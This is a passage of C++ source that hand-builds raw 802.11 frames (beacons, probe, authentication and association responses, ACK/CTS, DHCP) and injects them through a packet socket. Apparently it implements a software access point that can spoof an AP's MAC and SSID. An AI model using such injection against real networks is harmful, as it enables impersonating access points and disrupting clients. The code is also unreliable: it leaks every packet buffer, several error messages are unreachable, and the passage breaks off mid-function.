    uint8_t *packet = (uint8_t*)std::malloc(BEACON_SIZE);
    if(!packet) {
        std::perror("malloc");
        return -1;
    }

    uint32_t remBytes = BEACON_SIZE; // remaining bytes

    // Configure Radiotap
    if(remBytes < sizeof(ie80211_rtaphdr)) {
        std::cerr << "\nrtap remBytes error\n";
        return -1;
    }

    ie80211_rtaphdr *rtap = (ie80211_rtaphdr*)((uint8_t*)packet);
    rtap->it_version = 0;
    rtap->it_len     = htole16(sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                       sizeof(chan_freq) + sizeof(chan_flags));
    rtap->it_present = (1 << IEEE80211_RADIOTAP_FLAGS) | (1 << IEEE80211_RADIOTAP_RATE) |
                       (1 << IEEE80211_RADIOTAP_CHANNEL);

    remBytes -= sizeof(*rtap); // update bytes
    
    // Add On Flags
    if(remBytes < sizeof(flags)) {
        std::cerr << "\nflags remBytes error\n";
        return -1;
    }

    uint8_t *flagsPtr = (uint8_t*)((uint8_t*)rtap + sizeof(ie80211_rtaphdr));
    *flagsPtr = flags;

    remBytes -= sizeof(flags); // update bytes

    // Add On Data Rate
    if(remBytes < sizeof(dRate)) {
        std::cerr << "\ndata rate remBytes error\n";
        return -1;
    }

    uint8_t *dataRatePtr = (uint8_t*)((uint8_t*)flagsPtr + sizeof(flags));
    *dataRatePtr = rate;

    remBytes -= sizeof(dRate); // update bytes

    // Add On Channel
    if(remBytes < sizeof(chan_freq)) {
        std::cerr << "\nchan freq remBytes error\n";
        return -1;
    }

    uint16_t *channel_freqPtr = (uint16_t*)((uint8_t*)dataRatePtr + sizeof(dRate));
    *channel_freqPtr = chan_freq;

    remBytes -= sizeof(chan_freq); // update bytes

    // Add On Channel Flags
    if(remBytes < sizeof(chan_flags)) {
        std::cerr << "\nchan flags remBytes error\n";
        return -1;
    }

    uint16_t *channel_flagsPtr = (uint16_t*)((uint8_t*)channel_freqPtr + sizeof(chan_freq));
    *channel_flagsPtr = chan_flags;

    remBytes -= sizeof(chan_flags); // update bytes

    // Configure 80211 Header
    if(remBytes < sizeof(ieee80211_hdr3)) {
        std::cerr << "\nmgmt hdr remBytes error\n";
        return -1;
    }
    
    ieee80211_mgmt_hdr *mgmt = (ieee80211_mgmt_hdr*)((uint8_t*)channel_flagsPtr + sizeof(chan_flags));
    mgmt->frame_control = 0; // version 0, nods 0
    mgmt->duration      = 0;
    mgmt->seq_ctrl      = htole16((++seqNum) << 4); // seq + frag, just update seq

    // Check probeResp Flag
    if(probeResp) { // probe response
        mgmt->frame_control |= WIFI_PROBERSP;
        if(!da) {
            std::cerr << "\nda error\n";
            return -1;
        }
        std::memcpy(mgmt->da, da, ETH_ALEN);
    }
    else { // beacon
        mgmt->frame_control |= WIFI_BEACON; // OR in Type, Subtype
        std::memcpy(mgmt->da, IEEE80211_BCAST_ADDR, ETH_ALEN);
    }
    
    std::memcpy(mgmt->sa,    apd->macAddr, ETH_ALEN);
    std::memcpy(mgmt->bssid, apd->macAddr, ETH_ALEN);
    
    remBytes -= sizeof(ieee80211_hdr3); // update bytes

    // Configure Beacon Info
    if(remBytes < sizeof(ieee80211_beacon)) {
        if(probeResp)
            std::cerr << "\nprobe resp remBytes error\n";
        else
            std::cerr << "\nbeacon remBytes error\n";

        return -1;
    }

    mgmt->u.beacon.timestamp  = 0; // calc later
    mgmt->u.beacon.beacon_int = htole16(BEACON_INTERVAL / 1024.00); // 102.4 ms(100 TU)
    mgmt->u.beacon.capab_info = htole16(0x0401); // Sent By ESS(AP), Short Slot Time In Use

    remBytes -= sizeof(ieee80211_beacon); // update bytes

    // Add SSID IE
    if(remBytes < sizeof(ieee80211_ie_ssid) + apd->ssidLen) {
        std::cerr << "\nssid remBytes error\n";
        return -1;
    }

    ieee80211_ie_ssid *ie_ssid = (ieee80211_ie_ssid*)((uint8_t*)mgmt + sizeof(ieee80211_hdr3) + sizeof(ieee80211_beacon));
    ie_ssid->id  = WLAN_MGMT_IE_SSID;
    ie_ssid->len = apd->ssidLen;
    std::memcpy(ie_ssid->ssid, apd->ssid, apd->ssidLen);
    
    remBytes -= sizeof(ieee80211_ie_ssid) + apd->ssidLen; // update bytes

    // Add Data Rates IE
    if(remBytes < sizeof(ieee80211_ie_rates) + apd->dataRatesLen) {
        std::cerr << "\ndata rates(ie) remBytes error\n";
        return -1;
    }

    ieee80211_ie_rates *ie_rates = (ieee80211_ie_rates*)((uint8_t*)ie_ssid +
                                   sizeof(ieee80211_ie_ssid) + apd->ssidLen);
    ie_rates->id  = WLAN_MGMT_IE_RATES;
    ie_rates->len = apd->dataRatesLen;
    std::memcpy(ie_rates->rates, apd->dataRates, apd->dataRatesLen);
   
    remBytes -= sizeof(ieee80211_ie_rates) + apd->dataRatesLen; // update bytes

    // Add DS Param(Channel) IE
    if(remBytes < sizeof(ieee80211_ie_ds_param)) {
        std::cerr << "\nds param remBytes error\n";
        return -1;
    }

    ieee80211_ie_ds_param *ie_ds_param = (ieee80211_ie_ds_param*)((uint8_t*)ie_rates + sizeof(ieee80211_ie_rates) + apd->dataRatesLen);
    ie_ds_param->id  = WLAN_MGMT_IE_DS_PARAM;
    ie_ds_param->len = sizeof(chan);
    ie_ds_param->cur_chan = chan;

    remBytes -= sizeof(ieee80211_ie_ds_param);

    // Add Traffic Indication Map(TIM)
    if(remBytes < sizeof(ieee80211_ie_tim)) {
        std::cerr << "\nTIM remBytes error\n";
        return -1;
    }

    ieee80211_ie_tim *ie_tim = (ieee80211_ie_tim*)((uint8_t*)ie_ds_param + sizeof(ieee80211_ie_ds_param));
    ie_tim->id  = WLAN_MGMT_IE_TIM;
    ie_tim->len = 4;
    ie_tim->DTIM_count  = 0;
    ie_tim->DTIM_period = 1; // tx bcast and mcast frames after every beacon
    ie_tim->bitmap_ctrl = 0; // false on mcast
    ie_tim->partial_virtual_bitmap = 0;

    remBytes -= sizeof(ieee80211_ie_tim);

    // Add Extended Rate-PHY (ERP) IE, Older 42 ID
    if(remBytes < sizeof(ieee80211_ie_erp_info)) {
        std::cerr << "\nERP_ie42 remBytes error\n";
        return -1;
    }
    
    ieee80211_ie_erp_info *ie_erp42 = (ieee80211_ie_erp_info*)((uint8_t*)ie_tim + sizeof(ieee80211_ie_tim));
    ie_erp42->id       = 42; // older
    ie_erp42->len      = sizeof(unsigned char);
    ie_erp42->erp_info = (1 << 0x02); // barker preamable mode

    remBytes -= sizeof(ieee80211_ie_erp_info); // update bytes

    /*// Add Extended Rate-PHY (ERP) IE, Newer 47 ID
    if(remBytes < sizeof(ieee80211_ie_erp_info)) {
        std::cerr << "\nERP_ie47 remBytes error\n";
        return -1;
    }
    
    ieee80211_ie_erp_info *ie_erp = (ieee80211_ie_erp_info*)((uint8_t*)ie_erp42 +
                                    sizeof(ieee80211_ie_erp_info));
    ie_erp->id       = WLAN_MGMT_IE_ERP;
    ie_erp->len      = sizeof(unsigned char);
    ie_erp->erp_info = (1 << 0x02); // barker preamable mode

    remBytes -= sizeof(ieee80211_ie_erp_info); // update bytes*/

    // Add Extended Data Rates IE
    if(remBytes < sizeof(ieee80211_ie_rates) + apd->dataRatesExtLen) {
        std::cerr << "\next data rates remBytes error\n";
        return -1;
    }

    ieee80211_ie_rates *ie_ext_rates = (ieee80211_ie_rates*)((uint8_t*)ie_erp42 + sizeof(ieee80211_ie_erp_info));
    ie_ext_rates->id  = WLAN_MGMT_IE_EXT_RATES;
    ie_ext_rates->len = apd->dataRatesExtLen;
    std::memcpy(ie_ext_rates->rates, apd->dataRatesExt, apd->dataRatesExtLen);

    remBytes -= sizeof(ieee80211_ie_rates) + apd->dataRatesExtLen; // update bytes

    // Add Frame Check Sequence(CRC32 over data - radiotap)
    if(remBytes < sizeof(uint32_t)) {
        std::cerr << "\nFCS remBytes error\n";
        return -1;
    }

    uint32_t *fcs = (uint32_t*)((uint8_t*)ie_ext_rates + sizeof(ieee80211_ie_rates) +
                    apd->dataRatesExtLen);

    // Add Final Timestamp, *closer to sendto(), the better
    mgmt->u.beacon.timestamp = htole64(getCurTstamp());
    if(!mgmt->u.beacon.timestamp) {
        std::cerr << "\ngetCurTstamp\n";
        return -1;
    }

    *fcs = htole32(calc_crc32(packet + le16toh(rtap->it_len), BEACON_SIZE - le16toh(rtap->it_len) - sizeof(uint32_t))); // checksum
    
    remBytes -= sizeof(uint32_t); // update bytes

    // Check Remaining Bytes
    if(remBytes) {
        std::cerr << "\nending remBytes error\n";
        return -1;
    }

    // Get Interface Index
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    dll.sll_ifindex  = ifr.ifr_ifindex;
    dll.sll_family   = AF_PACKET;
    dll.sll_protocol = htons(ETH_P_802_2);
    dll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    //dll.sll_pkttype  = PACKET_OTHERHOST;
    //dll.sll_halen    = ETH_ALEN;
    //std::memcpy(&dll.sll_addr, ether_aton((const char*)da), ETH_ALEN);

    // Send Frame
    if(sendto(sfd, packet, BEACON_SIZE, 0, (sockaddr*)&dll, sizeof(sockaddr_ll)) == -1) {
        std::perror("sendto");
        return -1;
    }

    // Success
    return 0;
}

int sendAuthResp(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
                 const unsigned char *const da, const int sfd) {
    // Check apd
    if(!apd) {
        std::cerr << "\napd error\n";
        return -1;
    }
    
    // Declarations
    ifreq       ifr;
    sockaddr_ll dll;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&dll, 0, sizeof(dll)); 

    // Set Rate
    uint8_t rate  = dRate & IEEE80211_RATE_VAL,
            flags = IEEE80211_RADIOTAP_F_FCS; // FCS

    // Get Channel
    uint16_t chan_freq  = chan_to_freq(chan);
    if(!chan_freq) {
        return -1;
        std::cerr << "\nchannel error";
    }

    uint16_t chan_flags = IEEE80211_CHAN_OFDM | IEEE80211_CHAN_2GHZ; // 0x00c0, OFDN + 2Ghz (pure-g)

    // Auth Size
    std::size_t AUTH_SIZE = sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                            sizeof(chan_freq) + sizeof(chan_flags) + 
                            sizeof(ieee80211_hdr3) + sizeof(ieee80211_auth) + sizeof(uint32_t/* FCS */);

    // Alloc Frame
    uint8_t *packet = (uint8_t*)std::malloc(AUTH_SIZE);
    if(!packet) {
        std::perror("malloc");
        return -1;
    }

    uint32_t remBytes = AUTH_SIZE; // remaining bytes

    // Configure Radiotap
    if(remBytes < sizeof(ie80211_rtaphdr)) {
        std::cerr << "\nrtap remBytes error\n";
        return -1;
    }

    ie80211_rtaphdr *rtap = (ie80211_rtaphdr*)((uint8_t*)packet);
    rtap->it_version = 0;
    rtap->it_len     = htole16(sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                       sizeof(chan_freq) + sizeof(chan_flags));
    rtap->it_present = (1 << IEEE80211_RADIOTAP_FLAGS) | (1 << IEEE80211_RADIOTAP_RATE) |
                       (1 << IEEE80211_RADIOTAP_CHANNEL);

    remBytes -= sizeof(*rtap); // update bytes
    
    // Add On Flags
    if(remBytes < sizeof(flags)) {
        std::cerr << "\nflags remBytes error\n";
        return -1;
    }

    uint8_t *flagsPtr = (uint8_t*)((uint8_t*)rtap + sizeof(ie80211_rtaphdr));
    *flagsPtr = flags;

    remBytes -= sizeof(flags); // update bytes

    // Add On Data Rate
    if(remBytes < sizeof(dRate)) {
        std::cerr << "\ndata rate remBytes error\n";
        return -1;
    }

    uint8_t *dataRatePtr = (uint8_t*)((uint8_t*)flagsPtr + sizeof(flags));
    *dataRatePtr = rate;

    remBytes -= sizeof(dRate); // update bytes

    // Add On Channel
    if(remBytes < sizeof(chan_freq)) {
        std::cerr << "\nchan freq remBytes error\n";
        return -1;
    }

    uint16_t *channel_freqPtr = (uint16_t*)((uint8_t*)dataRatePtr + sizeof(dRate));
    *channel_freqPtr = chan_freq;

    remBytes -= sizeof(chan_freq); // update bytes

    // Add On Channel Flags
    if(remBytes < sizeof(chan_flags)) {
        std::cerr << "\nchan flags remBytes error\n";
        return -1;
    }

    uint16_t *channel_flagsPtr = (uint16_t*)((uint8_t*)channel_freqPtr + sizeof(chan_freq));
    *channel_flagsPtr = chan_flags;

    remBytes -= sizeof(chan_flags); // update bytes

    // Configure 80211 Header
    if(remBytes < sizeof(ieee80211_hdr3)) {
        std::cerr << "\nmgmt hdr remBytes error\n";
        return -1;
    }
    
    ieee80211_mgmt_hdr *mgmt = (ieee80211_mgmt_hdr*)((uint8_t*)channel_flagsPtr + sizeof(chan_flags));
    mgmt->frame_control  = 0; // version 0, nods 0
    mgmt->duration       = htole16(304); // 304 microsecs
    mgmt->seq_ctrl       = htole16((++seqNum) << 4); // seq + frag, just update seq
    mgmt->frame_control |= WIFI_AUTH; // authentication
    
    // Check Dest Addr
    if(!da) {
        std::cerr << "\nda error\n";
        return -1;
    }
    std::memcpy(mgmt->da,    da,           ETH_ALEN);
    std::memcpy(mgmt->sa,    apd->macAddr, ETH_ALEN);
    std::memcpy(mgmt->bssid, apd->macAddr, ETH_ALEN);

    remBytes -= sizeof(ieee80211_hdr3); // update bytes

    // Configure Authentication Info
    if(remBytes < sizeof(ieee80211_auth)) {
        std::cerr << "\nauth remBytes error\n";
        return -1;
    }

    mgmt->u.auth.auth_alg         = htole16(WLAN_AUTH_OPEN);      // open system
    mgmt->u.auth.auth_transaction = htole16(0x0002);              // 2 for seq
    mgmt->u.auth.status_code      = htole16(WLAN_STATUS_SUCCESS); // success

    remBytes -= sizeof(ieee80211_auth); // update bytes

    // Configure Info Elements
    /* add challenge text here */

    // Add Frame Check Sequence(CRC32 over data - radiotap)
    if(remBytes < sizeof(uint32_t)) {
        std::cerr << "\nFCS remBytes error\n";
        return -1;
    }

    uint32_t *fcs = (uint32_t*)((uint8_t*)mgmt + sizeof(ieee80211_hdr3) + sizeof(ieee80211_auth));
    *fcs = htole32(calc_crc32(packet + le16toh(rtap->it_len), AUTH_SIZE - le16toh(rtap->it_len) - sizeof(uint32_t))); // checksum
    
    remBytes -= sizeof(uint32_t); // update bytes

    // Check Remaining Bytes
    if(remBytes) {
        std::cerr << "\nending remBytes error\n";
        return -1;
    }

    // Get Interface Index
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    dll.sll_ifindex  = ifr.ifr_ifindex;
    dll.sll_family   = AF_PACKET;
    dll.sll_protocol = htons(ETH_P_802_2);
    dll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    //dll.sll_pkttype  = PACKET_OUTGOING;
    //dll.sll_halen    = ETH_ALEN;
    //std::memcpy(&dll.sll_addr, apd->macAddr, ETH_ALEN);

    // Send Frame
    if(sendto(sfd, packet, AUTH_SIZE, 0, (sockaddr*)&dll, sizeof(sockaddr_ll)) == -1) {
        std::perror("sendto");
        return -1;
    }

    std::cout << "\nAUTH";
    std::fflush(stdout);

    // Success
    return 0;
}

int sendAssoscResp(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
                   const unsigned char *const da, const int sfd) {
    // Check apd
    if(!apd) {
        std::cerr << "\napd error\n";
        return -1;
    }
   
    // Declarations
    ifreq       ifr;
    sockaddr_ll dll;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&dll, 0, sizeof(dll));
    
    // Set Rate
    uint8_t rate  = dRate & IEEE80211_RATE_VAL,
            flags = IEEE80211_RADIOTAP_F_FCS;

    // Get Channel
    uint16_t chan_freq  = chan_to_freq(chan);
    if(!chan_freq) {
        return -1;
        std::cerr << "\nchannel error";
    }

    uint16_t chan_flags = IEEE80211_CHAN_OFDM | IEEE80211_CHAN_2GHZ; // 0x00c0, OFDN + 2Ghz (pure-g)*/

    // Assoc Size
    std::size_t ASSOSC_SIZE = sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) + 
                              sizeof(chan_freq) + sizeof(chan_flags) + sizeof(ieee80211_hdr3) +
                              sizeof(ieee80211_assoc_resp) + sizeof(ieee80211_ie_rates) + apd->dataRatesLen +
                              sizeof(ieee80211_ie_rates) + apd->dataRatesExtLen + sizeof(uint32_t/* FCS)*/);

    // Alloc Frame
    uint8_t *packet = (uint8_t*)std::malloc(ASSOSC_SIZE);
    if(!packet) {
        std::perror("malloc");
        return -1;
    }

    uint32_t remBytes = ASSOSC_SIZE; // remaining bytes

    // Configure Radiotap
    if(remBytes < sizeof(ie80211_rtaphdr)) {
        std::cerr << "\nrtap remBytes error\n";
        return -1;
    }

    ie80211_rtaphdr *rtap = (ie80211_rtaphdr*)((uint8_t*)packet);
    rtap->it_version  = 0;
    rtap->it_len      = htole16(sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                        sizeof(chan_freq) + sizeof(chan_flags));
    rtap->it_present  = (1 << IEEE80211_RADIOTAP_FLAGS) | (1 << IEEE80211_RADIOTAP_RATE) |
                        (1 << IEEE80211_RADIOTAP_CHANNEL);

    remBytes -= sizeof(*rtap); // update bytes
    
    // Add On Flags
    if(remBytes < sizeof(flags)) {
        std::cerr << "\nflags remBytes error\n";
        return -1;
    }

    uint8_t *flagsPtr = (uint8_t*)((uint8_t*)rtap + sizeof(ie80211_rtaphdr));
    *flagsPtr = flags;

    remBytes -= sizeof(flags); // update bytes

    // Add On Data Rate
    if(remBytes < sizeof(dRate)) {
        std::cerr << "\ndata rate remBytes error\n";
        return -1;
    }

    uint8_t *dataRatePtr = (uint8_t*)((uint8_t*)flagsPtr + sizeof(flags));
    *dataRatePtr = rate;

    remBytes -= sizeof(dRate); // update bytes

    // Add On Channel
    if(remBytes < sizeof(chan_freq)) {
        std::cerr << "\nchan freq remBytes error\n";
        return -1;
    }

    uint16_t *channel_freqPtr = (uint16_t*)((uint8_t*)dataRatePtr + sizeof(dRate));
    *channel_freqPtr = chan_freq;

    remBytes -= sizeof(chan_freq); // update bytes

    // Add On Channel Flags
    if(remBytes < sizeof(chan_flags)) {
        std::cerr << "\nchan flags remBytes error\n";
        return -1;
    }

    uint16_t *channel_flagsPtr = (uint16_t*)((uint8_t*)channel_freqPtr + sizeof(chan_freq));
    *channel_flagsPtr = chan_flags;

    remBytes -= sizeof(chan_flags); // update bytes*/

    // Configure 80211 Header
    if(remBytes < sizeof(ieee80211_hdr3)) {
        std::cerr << "\nmgmt hdr remBytes error\n";
        return -1;
    }
    
    ieee80211_mgmt_hdr *mgmt = (ieee80211_mgmt_hdr*)((uint8_t*)channel_flagsPtr + sizeof(chan_flags));
    mgmt->frame_control  = 0; // version 0, nods 0
    mgmt->duration       = htole16(304); // 304 microsecs
    mgmt->seq_ctrl       = htole16((++seqNum) << 4); // seq + frag, just update seq
    mgmt->frame_control |= WIFI_ASSOCRSP; // assoc resp
    
    // Check Dest Addr
    if(!da) {
        std::cerr << "\nda error\n";
        return -1;
    }
    std::memcpy(mgmt->da, da, ETH_ALEN);
    
    std::memcpy(mgmt->sa, apd->macAddr, ETH_ALEN);
    std::memcpy(mgmt->bssid, apd->macAddr, ETH_ALEN);

    remBytes -= sizeof(ieee80211_hdr3); // update bytes

    // Add Association Response Info
    if(remBytes < sizeof(ieee80211_assoc_resp)) {
        std::cerr << "\nassoc resp remBytes error\n";
        return -1;
    }

    mgmt->u.assoc_resp.capab_info  = htole16(0x0401); // Sent By ESS(AP), Short Slot Time In Use
    mgmt->u.assoc_resp.status_code = htole16(WLAN_STATUS_SUCCESS); // success
    mgmt->u.assoc_resp.aid         = htole16(0x0001); // id of 1

    remBytes -= sizeof(ieee80211_assoc_resp); // update bytes
    
    // Add Data Rates IE
    if(remBytes < sizeof(ieee80211_ie_rates) + apd->dataRatesLen) {
        std::cerr << "\ndata rates(ie) remBytes error\n";
        return -1;
    }

    ieee80211_ie_rates *ie_rates = (ieee80211_ie_rates*)((uint8_t*)mgmt + sizeof(ieee80211_hdr3) + sizeof(ieee80211_assoc_resp));
    ie_rates->id  = WLAN_MGMT_IE_RATES;
    ie_rates->len = apd->dataRatesLen;
    std::memcpy(ie_rates->rates, apd->dataRates, apd->dataRatesLen);
   
    remBytes -= sizeof(ieee80211_ie_rates) + apd->dataRatesLen; // update bytes

    // Add Extended Data Rates IE
    if(remBytes < sizeof(ieee80211_ie_rates) + apd->dataRatesExtLen) {
        std::cerr << "\next data rates remBytes error\n";
        return -1;
    }

    ieee80211_ie_rates *ie_ext_rates = (ieee80211_ie_rates*)((uint8_t*)ie_rates + sizeof(ieee80211_ie_rates) + apd->dataRatesLen);
    ie_ext_rates->id  = WLAN_MGMT_IE_EXT_RATES;
    ie_ext_rates->len = apd->dataRatesExtLen;
    std::memcpy(ie_ext_rates->rates, apd->dataRatesExt, apd->dataRatesExtLen);

    remBytes -= sizeof(ieee80211_ie_rates) + apd->dataRatesExtLen; // update bytes

    // Add Frame Check Sequence(CRC32 over data - radiotap)
    if(remBytes < sizeof(uint32_t)) {
        std::cerr << "\nFCS remBytes error\n";
        return -1;
    }

    uint32_t *fcs = (uint32_t*)((uint8_t*)ie_ext_rates + sizeof(ieee80211_ie_rates) + apd->dataRatesExtLen);
    *fcs = htole32(calc_crc32(packet + le16toh(rtap->it_len), ASSOSC_SIZE - le16toh(rtap->it_len) - sizeof(uint32_t))); // checksum
    
    remBytes -= sizeof(uint32_t); // update bytes

    // Check Remaining Bytes
    if(remBytes) {
        std::cerr << "\nending remBytes error\n";
        return -1;
    }

    // Get Interface Index
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    dll.sll_ifindex  = ifr.ifr_ifindex;
    dll.sll_family   = AF_PACKET;
    dll.sll_protocol = htons(ETH_P_802_2);
    dll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    //dll.sll_pkttype  = PACKET_OUTGOING;
    //dll.sll_halen    = ETH_ALEN;
    //std::memcpy(&dll.sll_addr, apd->macAddr, ETH_ALEN);

    // Send Frame
    if(sendto(sfd, packet, ASSOSC_SIZE, 0, (sockaddr*)&dll, sizeof(sockaddr_ll)) == -1) {
        std::perror("sendto");
        return -1;
    }

    std::cout << "\nASSOC";
    std::fflush(stdout);

    // Success
    return 0;
}

int sendAck(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
            const unsigned char *const ra, const bool ctsFlag, const int sfd) {
    // Check apd
    if(!apd) {
        std::cerr << "\napd error\n";
        return -1;
    } 
       
    // Declarations
    ifreq       ifr;
    sockaddr_ll dll;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&dll, 0, sizeof(dll));

    // Set Rate
    uint8_t rate  = dRate & IEEE80211_RATE_VAL,
            flags = IEEE80211_RADIOTAP_F_FCS;

    // Get Channel
    uint16_t chan_freq  = chan_to_freq(chan);
    if(!chan_freq) {
        return -1;
        std::cerr << "\nchannel error\n";
    }

    uint16_t chan_flags = IEEE80211_CHAN_OFDM | IEEE80211_CHAN_2GHZ; // 0x00c0, OFDN + 2Ghz (pure-g)*/

    // Ack Size
    std::size_t ACK_SIZE = sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                           sizeof(chan_freq) + sizeof(chan_flags) + sizeof(ieee80211_ack_hdr) +
                           sizeof(uint32_t/* FCS */);

    // Alloc Frame
    uint8_t *packet = (uint8_t*)std::malloc(ACK_SIZE);
    if(!packet) {
        std::perror("malloc");
        return -1;
    }

    uint32_t remBytes = ACK_SIZE; // remaining bytes

    // Configure Radiotap
    if(remBytes < sizeof(ie80211_rtaphdr)) {
        std::cerr << "\nrtap remBytes error\n";
        return -1;
    }

    ie80211_rtaphdr *rtap = (ie80211_rtaphdr*)((uint8_t*)packet);
    rtap->it_version  = 0;
    rtap->it_len      = htole16(sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                        sizeof(chan_freq) + sizeof(chan_flags));
    rtap->it_present  = (1 << IEEE80211_RADIOTAP_FLAGS) | (1 << IEEE80211_RADIOTAP_RATE) |
                        (1 << IEEE80211_RADIOTAP_CHANNEL);

    remBytes -= sizeof(*rtap); // update bytes
    
    // Add On Flags
    if(remBytes < sizeof(flags)) {
        std::cerr << "\nflags remBytes error\n";
        return -1;
    }

    uint8_t *flagsPtr = (uint8_t*)((uint8_t*)rtap + sizeof(ie80211_rtaphdr));
    *flagsPtr = flags;

    remBytes -= sizeof(flags); // update bytes

    // Add On Data Rate
    if(remBytes < sizeof(dRate)) {
        std::cerr << "\ndata rate remBytes error\n";
        return -1;
    }

    uint8_t *dataRatePtr = (uint8_t*)((uint8_t*)flagsPtr + sizeof(flags));
    *dataRatePtr = rate;

    remBytes -= sizeof(dRate); // update bytes

    // Add On Channel
    if(remBytes < sizeof(chan_freq)) {
        std::cerr << "\nchan freq remBytes error\n";
        return -1;
    }

    uint16_t *channel_freqPtr = (uint16_t*)((uint8_t*)dataRatePtr + sizeof(dRate));
    *channel_freqPtr = chan_freq;

    remBytes -= sizeof(chan_freq); // update bytes

    // Add On Channel Flags
    if(remBytes < sizeof(chan_flags)) {
        std::cerr << "\nchan flags remBytes error\n";
        return -1;
    }

    uint16_t *channel_flagsPtr = (uint16_t*)((uint8_t*)channel_freqPtr + sizeof(chan_freq));
    *channel_flagsPtr = chan_flags;

    remBytes -= sizeof(chan_flags); // update bytes*/

    // Configure 80211 Header
    if(remBytes < sizeof(ieee80211_ack_hdr)) {
        std::cerr << "\nctrl ack hdr remBytes error\n";
        return -1;
    }
    
    ieee80211_ack_hdr *ctrl = (ieee80211_ack_hdr*)((uint8_t*)channel_flagsPtr + sizeof(chan_flags));
    ctrl->frame_control = 0; // version 0, nods 0
    if(ctsFlag)
        ctrl->duration = htole16(29000); // 29000 microsecs
    else
        ctrl->duration = 0;

    if(ctsFlag)
        ctrl->frame_control |= WIFI_CTS; // clear to send
    else
        ctrl->frame_control |= WIFI_ACK; // ack
    
    // Check Dest Addr
    if(!ra) {
        std::cerr << "\nda error\n";
        return -1;
    }
    std::memcpy(ctrl->ra, ra, ETH_ALEN);

    remBytes -= sizeof(ieee80211_ack_hdr); // update bytes

    // Add Frame Check Sequence(CRC32 over data - radiotap)
    if(remBytes < sizeof(uint32_t)) {
        std::cerr << "\nFCS remBytes error\n";
        return -1;
    }

    uint32_t *fcs = (uint32_t*)((uint8_t*)ctrl + sizeof(ieee80211_ack_hdr));
    *fcs = htole32(calc_crc32(packet + le16toh(rtap->it_len), ACK_SIZE - le16toh(rtap->it_len) - sizeof(uint32_t))); // checksum
    
    remBytes -= sizeof(uint32_t); // update bytes

    // Check Remaining Bytes
    if(remBytes) {
        std::cerr << "\nending remBytes error\n";
        return -1;
    }

    // Get Interface Index
    std::strncpy(ifr.ifr_name, iface, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIFINDEX, &ifr) == -1) {
        std::perror("ioctl - SIOCGIFINDEX");
        return -1;
    }

    // Set Up Socket Link-Layer Address
    dll.sll_ifindex  = ifr.ifr_ifindex;
    dll.sll_family   = AF_PACKET;
    dll.sll_protocol = htons(ETH_P_802_2);
    dll.sll_hatype   = htons(ARPHRD_IEEE80211_RADIOTAP);
    //dll.sll_pkttype  = PACKET_OUTGOING;
    //dll.sll_halen    = ETH_ALEN;
    //std::memcpy(&dll.sll_addr, apd->macAddr, ETH_ALEN);

    // Send Frame
    if(sendto(sfd, packet, ACK_SIZE, 0, (sockaddr*)&dll, sizeof(sockaddr_ll)) == -1) {
        std::perror("sendto");
        return -1;
    }    

    // Success
    return 0;
}

int sendDHCP(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
             const uint8_t *const tip, const uint8_t *const tha, const uint32_t dhcp_xid, const int sfd, const uint8_t dhcp_type) {
    // Check Values
    if(!apd || !iface || !tip || !tha) {
        std::cerr << "\nsendDHCP: value error\n";
        return -1;
    }
    
    // Declarations
    ifreq       ifr;
    sockaddr_ll dll;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&dll, 0, sizeof(dll)); 

    // Set Rate
    uint8_t rate  = dRate & IEEE80211_RATE_VAL,
            flags = IEEE80211_RADIOTAP_F_FCS;

    // Get Channel
    uint16_t chan_freq = chan_to_freq(chan);
    if(!chan_freq) {
        return -1;
        std::cerr << "\nsendDHCP: channel error";
    }

    uint16_t chan_flags = IEEE80211_CHAN_OFDM | IEEE80211_CHAN_2GHZ; // 0x00c0, OFDN + 2Ghz (pure-g)

    // Beacon Size
    std::size_t DHCP_SIZE = sizeof(ie80211_rtaphdr) + sizeof(flags) + sizeof(dRate) +
                            sizeof(chan_freq) + sizeof(chan_flags) + sizeof(ieee80211_hdr3) +
                            sizeof(llc_snap_hdr) + sizeof(iphdr) + sizeof(udphdr) + sizeof(dhcphdr) +
                            sizeof(dhcp_options) + sizeof(uint32_t/* FCS */);

    // Alloc Frame
    uint8_t *const packet = (uint8_t*)std::malloc(DHCP_SIZE);
    if(!packet) {
        std::perror("sendDHCP: malloc");
        return -1;
    }

    uint32_t remBytes = DHCP_SIZE; // remaining bytes

    // Configure Radiotap
    if(remBytes < sizeof(ie80211_rtaphdr)) {
        std::cerr << "\nsendDHCP: rtap remBytes error\n";
        return -1;
    }

    ie80211_rtaphdr *const rtap = (ie80211_rtaphdr*)((uint8_t*)packet);
    rtap->it_version = 0;
